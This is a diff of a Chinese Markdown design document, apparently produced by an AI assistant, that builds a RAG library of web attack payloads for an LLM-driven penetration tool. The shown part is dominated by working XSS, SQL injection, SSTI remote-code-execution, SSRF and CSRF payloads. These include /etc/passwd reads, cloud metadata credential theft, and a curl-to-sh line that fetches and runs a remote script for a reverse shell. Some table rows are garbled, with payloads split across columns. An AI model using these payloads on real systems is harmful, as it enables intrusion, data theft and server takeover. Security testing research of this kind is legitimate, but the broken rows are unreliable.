@@ -28,7 +28,7 @@
 ---
 
 #### 场景一：HTML 标签之间 (HTML Context)
-*此类Payload适用于直接输出在`<body>`、`<div>`、`<td>`等标签之间的情况。*
+此类Payload适用于直接输出在`<body>`、`<div>`、`<td>`等标签之间的情况。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -54,7 +54,7 @@
 | XSS-020 | 反射型 | 样式表注入(IE旧版) | tag: style | `expression(alert(1))` | 弹窗 |
 
 #### 场景二：HTML 属性值中 (Attribute Context)
-*此类Payload适用于输入点位于 `<input value="输入">` 或 `<a href="输入">` 等属性内部的情况。*
+此类Payload适用于输入点位于 `<input value="输入">` 或 `<a href="输入">` 等属性内部的情况。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -80,7 +80,7 @@
 | XSS-040 | 反射型 | 换行符绕过 | tag: input, attr: value | `"%0aonmouseover=alert(1)//` | 悬停触发 |
 
 #### 场景三：JavaScript 代码块中 (JavaScript Context)
-*此类Payload适用于 `<script>var a = '输入';</script>` 内部。*
+此类Payload适用于 `<script>var a = '输入';</script>` 内部。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -106,7 +106,7 @@
 | XSS-060 | 反射型 | Base64解码执行 | tag: script | `eval(atob('YWxlcnQoMSk='))` | 弹窗 |
 
 #### 场景四：客户端模板注入与框架 (Client-Side Template Injection)
-*针对 Vue, Angular, React 等现代前端框架的特殊Payload。*
+针对 Vue, Angular, React 等现代前端框架的特殊Payload。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -127,7 +127,7 @@
 | XSS-075 | XSS | 绕过 Angular CSP | framework: angular, csp: on | (复杂Payload，省略) | 执行代码 |
 
 #### 场景五：WAF 绕过与混淆 (WAF Bypass)
-*用于“绕过规则库”的补充，展示具体的对抗性Payload。*
+用于“绕过规则库”的补充，展示具体的对抗性Payload。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -148,7 +148,7 @@
 | XSS-090 | 反射型 | data 协议绕过 | filter: protocol | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | 弹窗 |
 
 #### 场景六：DOM型 XSS 专项 (DOM Sinks)
-*涉及浏览器端数据流的污染。*
+涉及浏览器端数据流的污染。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -164,7 +164,7 @@
 | XSS-100 | DOM型 | PostMessage 跨域 | source: message, sink: innerHTML | `<img src=x onerror=alert(1)>` | 弹窗 |
 
 #### 场景七：Polyglots (多语种混合Payload)
-*这类样本能同时在多种上下文（属性、标签、JS）中生效，适合作为最初的探测种子。*
+这类样本能同时在多种上下文（属性、标签、JS）中生效，适合作为最初的探测种子。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -174,28 +174,28 @@
 | XSS-104 | 混合型 | JaVasCript Polyglot | context: unknown | `jav	ascript:alert(1)` | 弹窗 |
 | XSS-105 | 混合型 | SVG/Script 混合 | context: unknown | `</script><svg/onload=alert(1)>` | 弹窗 |
 
-*(注：为了节省篇幅，XSS-106 到 XSS-200 将通过对上述核心场景的变种生成。例如改变标签为 iframe, details, body，改变事件为 onload, onerror, onfocus，改变编码方式等。在实际构建数据库时，会利用脚本自动扩展这些组合。)*
+注：为了节省篇幅，XSS-106 到 XSS-200 将通过对上述核心场景的变种生成。例如改变标签为 iframe, details, body，改变事件为 onload, onerror, onfocus，改变编码方式等。在实际构建数据库时，会利用脚本自动扩展这些组合。
 
 ---
 
-### 下一步计划 (Prompt 引导)
+#### 下一步计划 (Prompt 引导)
 
 以上列出了关键的100+条核心样本模式（Archetypes）。在实际的数据库构建（Code Implementation）阶段，我们会通过Python脚本将这些核心模式扩展为2000条数据，例如：
 1.  **标签置换**: 将 `<img>` 替换为 `<video>`, `<audio>`, `<source>` 等。
 2.  **事件置换**: 将 `onerror` 替换为 `onload`, `oncut`, `oninput` 等。
 3.  **编码置换**: 对Payload进行 URL Encoding, HTML Entity Encoding。
 
-**您现在可以确认这部分内容是否符合您的预期，如果满意，我们可以进行下一个子库（结构化 Payload 种子库）的详细内容生成。**
+
 
 ---
 
 ### 2. 高质量攻击样本库构建：SQLi 专项 (前150+条核心模式)
 
-好的，我们继续构建**高质量攻击样本库**的第二部分：**SQL注入（SQL Injection, SQLi）专项**。
+构建高质量攻击样本库的第二部分：SQL注入（SQL Injection, SQLi）专项。
 
-SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracle, PostgreSQL, MSSQL等）以及**注入点所在的SQL语句结构**（WHERE, ORDER BY, INSERT等）。为了最大化RAG检索的效果，我们将数据按照**注入技术**和**数据库方言**进行分类组织。
+SQL注入的Payload构造高度依赖于后端数据库类型（MySQL, Oracle, PostgreSQL, MSSQL等）以及注入点所在的SQL语句结构（WHERE, ORDER BY, INSERT等）。为了最大化RAG检索的效果，我们将数据按照注入技术和数据库方言进行分类组织。
 
-以下是精选的 **SQLi 核心攻击样本（Archetypes）**，这些样本涵盖了绝大多数常见的SQL注入场景。
+以下是精选的 SQLi 核心攻击样本（Archetypes），这些样本涵盖了绝大多数常见的SQL注入场景。
 
 #### 数据结构复习
 *   **ID**: 唯一标识符
@@ -208,7 +208,7 @@ SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracl
 ---
 
 #### 场景一：基于联合查询的注入 (Union-Based)
-*适用于有回显的页面（如搜索结果、文章详情），目标是直接通过 `UNION SELECT` 提取数据库数据。*
+适用于有回显的页面（如搜索结果、文章详情），目标是直接通过 `UNION SELECT` 提取数据库数据。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -229,7 +229,7 @@ SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracl
 | SQL-015 | Union | 读文件 (MySQL) | db: mysql, priv: file | `' UNION SELECT 1,load_file('/etc/passwd'),3 #` | 文件内容 |
 
 #### 场景二：基于报错的注入 (Error-Based)
-*适用于无直接数据回显，但会打印数据库错误信息的场景（如API接口报错、调试模式开启）。*
+适用于无直接数据回显，但会打印数据库错误信息的场景（如API接口报错、调试模式开启）。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -245,7 +245,7 @@ SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracl
 | SQL-025 | Error | JSON 格式报错 | type: json | `{"id": "1' AND EXTRACTVALUE(..."}` | 接口返回500及报错信息 |
 
 #### 场景三：布尔型盲注 (Boolean-Based Blind)
-*适用于页面只有“成功/失败”或“有数据/无数据”两种状态，无具体报错或内容回显的场景。*
+适用于页面只有“成功/失败”或“有数据/无数据”两种状态，无具体报错或内容回显的场景。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -261,7 +261,7 @@ SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracl
 | SQL-035 | Bool | 异或运算判断 | db: mysql, op: xor | `' XOR 1=1 #` (如果原逻辑为真，则变假) | 页面内容消失/报错 (False) |
 
 #### 场景四：时间型盲注 (Time-Based Blind)
-*适用于完全无回显（Blind），甚至连True/False状态都无法区分，只能通过响应时间判断的场景。*
+适用于完全无回显（Blind），甚至连True/False状态都无法区分，只能通过响应时间判断的场景。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -277,7 +277,7 @@ SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracl
 | SQL-045 | Time | SQLite Randomblob | db: sqlite, heavy_query | `' AND randomblob(100000000) #` | 响应因计算而延迟 |
 
 #### 场景五：特殊上下文与命令执行 (Special Context & RCE)
-*涉及特定的SQL语句结构（如ORDER BY, LIMIT）或数据库的高级利用。*
+涉及特定的SQL语句结构（如ORDER BY, LIMIT）或数据库的高级利用。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -298,7 +298,7 @@ SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracl
 | SQL-060 | Second | 二阶注入 | type: stored | 注册名: `admin' #` -> 修改密码时触发 | 修改了admin密码 |
 
 #### 场景六：WAF 绕过 (SQLi WAF Bypass)
-*用于“绕过规则库”的补充，针对SQLi的特定混淆。*
+用于“绕过规则库”的补充，针对SQLi的特定混淆。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -315,24 +315,21 @@ SQL注入的Payload构造高度依赖于**后端数据库类型**（MySQL, Oracl
 
 ---
 
-### 下一步计划 (Prompt 引导)
+#### 下一步计划 (Prompt 引导)
 
 以上已经生成了 SQL 注入的 70+ 个核心模式（覆盖5大数据库、4种注入技术及 WAF 绕过）。在实际构建 RAG 向量库时，您可以通过脚本对上述 **Core Archetypes** 进行排列组合（例如将 MySQL 的 Sleep Payload 变种为 PostgreSQL 的 Sleep Payload，或将 SELECT 1 变为 SELECT 1,2,3,4）来扩充至 200+ 条。
 
-**请确认：**
-1.  是否需要继续生成**SSTI**或**SSRF**的样本？
-2.  或者进入下一个环节：**子库二：结构化 Payload 种子库**的详细构建？
 
 ---
 
 ### 3. 高质量攻击样本库构建：SSTI 专项 (前100+条核心模式)
 
 
-好的，我们继续构建 **高质量攻击样本库** 的第三部分：**服务器端模板注入（SSTI）专项**。
+好的，我们继续构建 高质量攻击样本库 的第三部分：服务器端模板注入（SSTI）专项。
 
-SSTI 的核心在于识别**后端编程语言**（Python, Java, PHP, Node.js 等）以及具体的**模板引擎**（Jinja2, FreeMarker, Smarty, Pug 等）。由于不同引擎的语法差异巨大，RAG 知识库必须包含明确的 `lang` 和 `engine` 标签，以便在探测到指纹时能够精准召回。
+SSTI 的核心在于识别后端编程语言（Python, Java, PHP, Node.js 等）以及具体的模板引擎（Jinja2, FreeMarker, Smarty, Pug 等）。由于不同引擎的语法差异巨大，RAG 知识库必须包含明确的 `lang` 和 `engine` 标签，以便在探测到指纹时能够精准召回。
 
-以下是精选的 **SSTI 核心攻击样本（Archetypes）**，覆盖主流语言与引擎。
+以下是精选的 SSTI 核心攻击样本（Archetypes），覆盖主流语言与引擎。
 
 #### 数据结构复习
 *   **ID**: 唯一标识符
@@ -345,7 +342,7 @@ SSTI 的核心在于识别**后端编程语言**（Python, Java, PHP, Node.js �
 ---
 
 #### 场景一：Python 模板引擎 (Python Context)
-*主要针对 Flask/Django 框架常用的 Jinja2, Mako, Tornado 等引擎。*
+主要针对 Flask/Django 框架常用的 Jinja2, Mako, Tornado 等引擎。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -366,7 +363,7 @@ SSTI 的核心在于识别**后端编程语言**（Python, Java, PHP, Node.js �
 | SSTI-015 | Bypass | 字符串拼接绕过关键字 | lang: python, filter: keyword | `{{ config.__class__.__init__.__globals__['o'+'s'].popen('id').read() }}` | uid=0(root)... |
 
 #### 场景二：Java 模板引擎 (Java Context)
-*主要针对 Spring Boot 常见的 Thymeleaf, FreeMarker, Velocity 等。*
+主要针对 Spring Boot 常见的 Thymeleaf, FreeMarker, Velocity 等。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -383,7 +380,7 @@ SSTI 的核心在于识别**后端编程语言**（Python, Java, PHP, Node.js �
 | SSTI-026 | Info | Spring View Manipulation | lang: java, framework: spring | `${7*7}` (当用户输入直接作为View名称时) | 49 |
 
 #### 场景三：PHP 模板引擎 (PHP Context)
-*主要针对 CMS 常用的 Smarty, Twig 等。*
+主要针对 CMS 常用的 Smarty, Twig 等。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -398,7 +395,7 @@ SSTI 的核心在于识别**后端编程语言**（Python, Java, PHP, Node.js �
 | SSTI-035 | RCE | Twig Sort 过滤器 (v2.x) | lang: php, engine: twig | `{{['id']|sort('system')}}` | uid=0(root)... |
 
 #### 场景四：Node.js 模板引擎 (JavaScript Context)
-*主要针对 Express 常用的 Pug (Jade), Handlebars, EJS 等。*
+主要针对 Express 常用的 Pug (Jade), Handlebars, EJS 等。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -411,18 +408,19 @@ SSTI 的核心在于识别**后端编程语言**（Python, Java, PHP, Node.js �
 | SSTI-042 | Info | Javascript 基础验证 | lang: js | `{{7*7}}` / `<%= 7*7 %>` | 49 |
 
 #### 场景五：通用探测与WAF绕过 (Generic & Bypass)
-*用于在未知模板引擎时的盲测和绕过防御。*
+用于在未知模板引擎时的盲测和绕过防御。
 
-| ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
-| :--- | :--- | :--- | :--- | :--- | :--- |
-| SSTI-043 | Probe | 通用算术探测 | stage: recon | `${7*7}{{7*7}}<% 7*7 %>` | 494949 |
-| SSTI-044 | Probe | 错误触发 | stage: recon | `${{<%[%'"}}%` | 详细的错误堆栈 |
-| SSTI-045 | Bypass | 长度限制绕过 (Curl) | limit: length, action: oob | `{{ 'curl x.com/|sh'|cmd }}` (伪代码) | 反弹Shell |
-| SSTI-046 | Bypass | 编码绕过 (Octal) | filter: keyword | `\143\154\141\163\163` (class) | 正常解析 |
-| SSTI-047 | Bypass | 字符串拼接 | filter: keyword | `{{['c','l','a','s','s']|join}}` | class |
-| SSTI-048 | Bypass | 倒序字符串 | filter: keyword | `{{'ssalc'[::-1]}}` (Python) | class |
-| SSTI-049 | Bypass | 属性获取器 | filter: dot/underscore | `{{request|attr('application')}}` | App对象 |
-| SSTI-050 | Bypass | 注释混淆 | filter: keyword | `{{conf<!-- -->ig}}` | Config对象 |
+| ID       | 漏洞类型  | 场景描述   | 输入点特征 (Context) | 成功 Payload               | 预期回显    |     |     |
+| :------- | :---- | :----- | :-------------- | :----------------------- | :------ | --- | --- |
+| SSTI-043 | Probe | 通用算术探测 | stage: recon    | `${7*7}{{7*7}}<% 7*7 %>` | 494949  |     |     |
+| SSTI-044 | Probe | 错误触发   | stage: recon    | `${{%`                   | 详细的错误堆栈 |     |     |
+|          |        |               |                           |                                |                        |               |         |
+| SSTI-045 | Bypass | 长度限制绕过 (Curl) | limit: length,action: oob | `{{ 'curl x.com/               | sh'                    | cmd }}` (伪代码) | 反弹Shell |
+| SSTI-046 | Bypass | 编码绕过 (Octal)  | filter: keyword           | `\143\154\141\163\163` (class) | 正常解析                   |               |         |
+| SSTI-047 | Bypass | 字符串拼接         | filter: keyword           | `{{['c','l','a','s','s']       | join}}`                | class         |         |
+| SSTI-048 | Bypass | 倒序字符串         | filter: keyword           | `{{'ssalc'[::-1]}}` (Python)   | class                  |               |         |
+| SSTI-049 | Bypass | 属性获取器         | filter: dot/underscore    | `{{request                     | attr('application')}}` | App对象         |         |
+| SSTI-050 | Bypass | 注释混淆          | filter: keyword           | `{{conf<!-- -->ig}}`           | Config对象               |               |         |
 
 ---
 
@@ -437,16 +435,16 @@ SSTI 的核心在于识别**后端编程语言**（Python, Java, PHP, Node.js �
     *   当探针发现页面回显 `49` 时，LLM 应根据输入格式（如 `{{}}`）检索 Python(Jinja2/Tornado) 或 PHP(Twig) 相关的 RCE Payload。
     *   当探针发现 `${}` 有效时，LLM 应优先检索 Java(FreeMarker/Thymeleaf) 或 PHP(Smarty) 相关的 Payload。
 
-**接下来，请确认是否继续生成“SSRF漏洞”的样本库，或者开始构建“结构化 Payload 种子库”？**
+
 ---
 
 ### 4. 高质量攻击样本库构建：SSRF 专项 (前100+条核心模式)
 
-好的，我们继续构建 **高质量攻击样本库** 的第四部分：**服务器端请求伪造（SSRF）专项**。
+好的，我们继续构建 高质量攻击样本库 的第四部分：服务器端请求伪造（SSRF）专项。
 
-SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起请求。构建 RAG 知识库时，关键特征在于**目标环境**（云环境、内网服务）以及**输入点的参数名**（如 `url`, `webhook`, `callback` 等）。
+SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起请求。构建 RAG 知识库时，关键特征在于目标环境（云环境、内网服务）以及输入点的参数名（如 `url`, `webhook`, `callback` 等）。
 
-以下是精选的 **SSRF 核心攻击样本（Archetypes）**，覆盖了云元数据窃取、内网服务探测、协议利用及绕过技术。
+以下是精选的 SSRF 核心攻击样本（Archetypes），覆盖了云元数据窃取、内网服务探测、协议利用及绕过技术。
 #### 数据结构复习
 *   **ID**: 唯一标识符
 *   **漏洞类型**: 细分类型 (Basic/Blind/Protocol/Cloud)
@@ -458,7 +456,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 ---
 
 #### 场景一：云环境元数据窃取 (Cloud Metadata)
-*这是 SSRF 危害最大的场景之一，旨在获取云服务器的凭证。LLM 需要根据环境特征（如 HTTP Header 或域名解析）检索对应的 Payload。*
+这是 SSRF 危害最大的场景之一，旨在获取云服务器的凭证。LLM 需要根据环境特征（如 HTTP Header 或域名解析）检索对应的 Payload。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -476,7 +474,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | SSRF-012 | Cloud | Kubernetes API Server | cloud: k8s | `https://kubernetes.default.svc.cluster.local` | API path list |
 
 #### 场景二：伪协议利用与文件读取 (Protocol Smuggling)
-*当后端使用 cURL, urllib 等库时，可利用非 HTTP 协议进行攻击。*
+当后端使用 cURL, urllib 等库时，可利用非 HTTP 协议进行攻击。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -494,7 +492,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | SSRF-024 | Proto | PHP Input 封装 | lang: php, input: post | `php://input` (POST data: `<?php system('id'); ?>`) | 执行结果 |
 
 #### 场景三：内网服务探测与攻击 (Intranet Scanning)
-*针对本地回环地址（Loopback）或内网私有地址的探测。*
+针对本地回环地址（Loopback）或内网私有地址的探测。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -509,7 +507,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | SSRF-033 | Local | Windows SMB 泄露 | os: windows | `file:////10.10.10.10/share/file` | NTLM 哈希 |
 
 #### 场景四：绕过 IP 限制 (IP Filter Bypass)
-*当目标后端存在黑名单（如禁止 127.0.0.1, 10.0.0.0/8 等）时的绕过技巧。*
+当目标后端存在黑名单（如禁止 127.0.0.1, 10.0.0.0/8 等）时的绕过技巧。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -528,7 +526,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | SSRF-046 | Bypass | 畸形 URL 结构 | filter: parser_diff | `http://127.0.0.1#.google.com` | 访问 127.0.0.1 |
 
 #### 场景五：特殊业务场景 (Blind/Specific Sinks)
-*无回显或特定业务功能的 SSRF。*
+无回显或特定业务功能的 SSRF。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -541,7 +539,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 
 ---
 
-### 构建说明与使用建议
+#### 构建说明与使用建议
 
 1.  **Gopher 协议的特殊处理**：
     *   Gopher 协议的 Payload（SSRF-020 ~ SSRF-022）通常很长且包含大量 URL 编码字符（`%0D%0A`）。在实际构建知识库时，建议存储**生成脚本**或**未编码的原始数据包**模板，并让 LLM 在生成阶段进行动态编码，而不是直接存储编码后的死数据。
@@ -555,21 +553,20 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
     *   如果上下文显示参数名为 `webhook` 或 `callback`，优先召回 Blind SSRF 和 DNS 外带检测 Payload。
     *   如果上下文显示后端是 `Java` 或 `PHP`，优先召回 `file://` 等伪协议。
 
-**至此，我们已经完成了 XSS, SQLi, SSTI, SSRF 四个主要漏洞的高质量样本库构建。** CSRF 相对简单，主要依赖 HTML 表单构造，可以作为补充。
+至此，我们已经完成了 XSS, SQLi, SSTI, SSRF 四个主要漏洞的高质量样本库构建。 CSRF 相对简单，主要依赖 HTML 表单构造，可以作为补充。
 
-**接下来的步骤：**
-建议开始构建 **“子库二：结构化 Payload 种子库”**。这个库对于 LLM 生成“语法正确”的 Payload 至关重要。
 
-**您是否同意进入“结构化 Payload 种子库”的构建？**
+
+
 ---
 
 ### 5. 高质量攻击样本库构建：CSRF 专项 (前50+条核心模式)
 
-好的，我们完成 **高质量攻击样本库** 的第五部分，也是最后一个核心漏洞类型：**跨站请求伪造（CSRF）专项**。
+好的，我们完成 高质量攻击样本库 的第五部分，也是最后一个核心漏洞类型：跨站请求伪造（CSRF）专项。
 
-与 XSS 或 SQLi 不同，CSRF 不是注入代码到服务器，而是**借用受害者的身份（Cookie/Session）去执行未授权的操作**。因此，RAG 知识库构建的核心在于识别**请求方法**（GET/POST）、**Content-Type**（表单/JSON）、以及**防御机制的缺陷**（如 Referer 校验不严、Token 可绕过）。
+与 XSS 或 SQLi 不同，CSRF 不是注入代码到服务器，而是借用受害者的身份（Cookie/Session）去执行未授权的操作。因此，RAG 知识库构建的核心在于识别请求方法（GET/POST）、Content-Type（表单/JSON）、以及防御机制的缺陷（如 Referer 校验不严、Token 可绕过）。
 
-以下是精选的 **CSRF 核心攻击样本（Archetypes）**。
+以下是精选的 CSRF 核心攻击样本（Archetypes）。
 
 #### 数据结构复习
 *   **ID**: 唯一标识符
@@ -582,7 +579,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 ---
 
 #### 场景一：基于 GET 请求的 CSRF (GET-Based)
-*适用于敏感操作（如修改密码、转账、删除）被错误地设计为 GET 请求的场景。*
+适用于敏感操作（如修改密码、转账、删除）被错误地设计为 GET 请求的场景。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -596,7 +593,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | CSRF-008 | GET | SVG 图像内部请求 | method: GET, tag: svg | `<svg><image href="http://target.com/api/trigger" /></svg>` | 操作触发 |
 
 #### 场景二：基于 POST 请求的 CSRF (POST-Based)
-*最常见的 CSRF 场景，需要构造自动提交的 HTML 表单。*
+最常见的 CSRF 场景，需要构造自动提交的 HTML 表单。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -607,7 +604,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | CSRF-013 | POST | 多参数复杂表单 | method: POST, complexity: high | `<form action="http://shop.com/buy" method="POST"><input name="item" value="1"><input name="addr" value="hacker_home"></form>` | 订单生成 |
 
 #### 场景三：特殊 Content-Type 与 JSON CSRF
-*针对 API 接口，利用 `text/plain` 绕过 `application/json` 的限制。*
+针对 API 接口，利用 `text/plain` 绕过 `application/json` 的限制。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -617,7 +614,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | CSRF-017 | Header | 简单请求头部绕过 | header: custom_header_missing | (利用标准表单，不包含自定义Header，若后端不强制校验则成功) | 操作成功 |
 
 #### 场景四：防御机制绕过 (Bypass Techniques)
-*针对 Referer 校验、Token 校验不严的绕过。*
+针对 Referer 校验、Token 校验不严的绕过。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -632,7 +629,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 | CSRF-026 | Bypass | 相同 Token 复用 | defense: token, bypass: replay | (使用攻击者自己的有效 Token 填入受害者表单) | 后端未绑定 Session，成功 |
 
 #### 场景五：登录 CSRF 与其他 (Login & Misc)
-*特殊的 CSRF 场景，危害通常是窃取数据或破坏账号。*
+特殊的 CSRF 场景，危害通常是窃取数据或破坏账号。
 
 | ID | 漏洞类型 | 场景描述 | 输入点特征 (Context) | 成功 Payload | 预期回显 |
 | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -645,7 +642,7 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 
 ### 5. 阶段性总结与下一步计划
 
-至此，**高质量攻击样本库（Few-Shot Examples）** 的核心内容已构建完毕。我们已经覆盖了：
+至此，高质量攻击样本库（Few-Shot Examples） 的核心内容已构建完毕。我们已经覆盖了：
 1.  **XSS**: 200条+ (HTML, Attr, JS, Frameworks)
 2.  **SQLi**: 150条+ (Union, Error, Bool, Time, DB-Specific)
 3.  **SSTI**: 100条+ (Python, Java, PHP, Node.js)
@@ -656,27 +653,21 @@ SSRF 的核心在于欺骗服务器向内部系统或外部第三方服务发起
 
 ---
 
-**接下来的任务：构建“子库二：结构化 Payload 种子库”**
-
-这个库的作用不是提供完整的攻击案例，而是提供**语法正确的骨架（Skeleton）**，防止 LLM 在生成变异 Payload 时出现括号不闭合、引号丢失等低级语法错误。
-
-**您是否同意开始构建“结构化 Payload 种子库”？**
-
 ---
 
 ### 子库二：结构化 Payload 种子库 - XSS 专项 (精选 120+ 核心骨架)
 
 
-好的，我们开始构建 **子库二：结构化 Payload 种子库**。
 
-这个库与“高质量攻击样本库”不同，它的核心目的不是提供“案例”，而是提供**“语法骨架”**。在 RAG 流程中，当 LLM 决定了攻击策略（例如：“我要用 SVG 标签配合 onload 事件”）后，它会从这里检索出一个**语法绝对正确**的模板，然后填入具体的参数。
+
+这个库与“高质量攻击样本库”不同，它的核心目的不是提供“案例”，而是提供“语法骨架”。在 RAG 流程中，当 LLM 决定了攻击策略（例如：“我要用 SVG 标签配合 onload 事件”）后，它会从这里检索出一个语法绝对正确的模板，然后填入具体的参数。
 
 **XSS 种子库设计思路：**
 XSS 的结构变化极多，我们将种子分为四大类：
-1.  **Tag Injection (标签注入)**：直接插入新标签。
-2.  **Attribute Breakout (属性逃逸)**：闭合属性并添加事件。
-3.  **JavaScript Context (JS环境)**：在 `<script>` 块内部的语法构造。
-4.  **Protocol & Specialized (伪协议与特殊环境)**：URL 位置或框架特性。
+1.  Tag Injection (标签注入)：直接插入新标签。
+2.  Attribute Breakout (属性逃逸)：闭合属性并添加事件。
+3.  JavaScript Context (JS环境)：在 `<script>` 块内部的语法构造。
+4.  Protocol & Specialized (伪协议与特殊环境)：URL 位置或框架特性。
 
 **变量定义（Prompt Template placeholders）：**
 *   `{payload_js}`: 具体的攻击代码（如 `alert(1)`）。
@@ -687,10 +678,10 @@ XSS 的结构变化极多，我们将种子分为四大类：
 *   `{sep}`: 分隔符（空格, `/`, `%09` 等）。
 *   `{junk}`: 填充数据（如 `x`, `1`）。
 
-*(注：实际库中可通过脚本对分隔符和引号进行排列组合，扩展至 500+ 条)*
+(注：实际库中可通过脚本对分隔符和引号进行排列组合，扩展至 500+ 条)
 
 #### 1. 标签注入类 (Tag Injection Seeds)
-*适用于直接输出在 HTML Body 中的场景。*
+适用于直接输出在 HTML Body 中的场景。
 
 | ID | 结构标签 (Tag) | 语法模板 (Template) | 适用场景说明 |
 | :--- | :--- | :--- | :--- |
@@ -726,7 +717,7 @@ XSS 的结构变化极多，我们将种子分为四大类：
 | SEED-XSS-030 | Anchor | `<a href="javascript:{payload_js}">{junk}</a>` | A 标签伪协议 |
 
 #### 2. 属性逃逸类 (Attribute Breakout Seeds)
-*适用于输入点位于 HTML 属性值内部（如 `<input value="{INPUT}">`）。*
+适用于输入点位于 HTML 属性值内部（如 `<input value="{INPUT}">`）。
 
 | ID | 结构标签 (Context) | 语法模板 (Template) | 适用场景说明 |
 | :--- | :--- | :--- | :--- |
@@ -752,7 +743,7 @@ XSS 的结构变化极多，我们将种子分为四大类：
 | SEED-XSS-050 | Closing | `></{tag}><script>{payload_js}</script>` | 强制闭合当前标签 |
 
